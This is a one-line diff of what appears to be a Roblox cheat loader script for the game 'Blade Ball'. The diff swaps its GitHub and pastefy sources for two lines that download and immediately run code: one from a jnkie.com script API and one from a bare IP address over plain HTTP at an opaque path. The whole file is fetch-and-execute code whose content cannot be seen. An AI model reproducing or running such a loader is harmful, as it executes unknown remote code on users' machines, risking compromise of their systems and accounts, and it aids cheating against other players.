@@ -1,1 +1,1 @@
-task.spawn(function()loadstring(game:HttpGet("https://raw.githubusercontent.com/AchaoticSoftworksCore/AchaoticSources/refs/heads/main/BladeBall/Main.luau"))()end)loadstring(game:HttpGet("https://pastefy.app/15gJEM25/raw"))()
+task.spawn(function()loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/aece70c42e9302654ece644321cdbd78d2d99a6eb5cc22bf5946b7f436bd474a/download"))()end)loadstring(game:HttpGet("http://84.200.89.110/qz999TKo5y0Wy8RH6k1NhRNT7Z5teNg4sEcRtOBEqkL9J2LesV1qCN8g9yw8L8gshWCp3Sa4E1Pz7H4S"))()
